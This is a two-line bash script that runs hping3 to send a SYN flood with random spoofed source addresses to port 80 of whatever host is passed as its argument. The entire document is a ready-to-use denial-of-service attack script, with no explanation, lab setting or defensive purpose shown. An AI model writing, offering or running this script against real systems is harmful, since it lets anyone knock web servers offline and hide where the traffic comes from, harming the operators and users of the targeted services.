#!/bin/bash
hping3 -p 80 -S --flood --rand-source $1
